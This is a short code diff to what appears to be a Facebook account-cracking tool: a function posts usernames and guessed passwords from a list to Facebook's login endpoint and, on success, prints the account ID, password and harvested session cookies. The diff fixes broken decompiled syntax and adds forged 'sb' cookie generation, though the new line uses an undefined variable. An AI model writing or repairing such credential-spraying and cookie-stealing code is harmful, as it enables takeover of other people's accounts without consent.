@@ -916,8 +916,7 @@ def api1(ids, names, passlist):
         url = 'https://b-graph.facebook.com/auth/login'
         po = requests.post(url, data = data, headers = head, allow_redirects = False, verify = True).json()
         if 'access_token' in po:
-            coki = (lambda .0: for i in .0:
-i['name'] + '=' + i['value']None)(po['session_cookies']())
+            coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
             print(f'''\r\r\x1b[1;37m\x1b[37;41m{R}[{G}OGGY-OK{R}]{G} ''' + ids + ' | ' + pas + '\x1b[0;0m')
             print(f'''\r{R}[{G}COOKIE{R}]{G}━{R}>{A} {coki}''')
             print(f'''{R}[{G}<>{R}]{G} https://www.facebook.com/{ids} ''')
